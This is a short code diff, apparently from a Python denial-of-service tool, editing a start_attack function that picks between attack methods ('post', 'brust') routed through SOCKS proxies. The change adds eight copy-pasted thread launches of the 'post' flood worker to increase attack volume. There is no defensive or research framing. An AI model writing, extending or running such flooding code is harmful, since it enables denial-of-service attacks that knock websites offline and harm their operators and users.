@@ -42,6 +42,14 @@ def start_attack(method, threads, event, socks_type):
                 threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
                 threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
                 threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
+                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
         elif method == "brust":
             for _ in range(threads):
                 threading.Thread(target=brust, args=(event, socks_type), daemon=True).start()
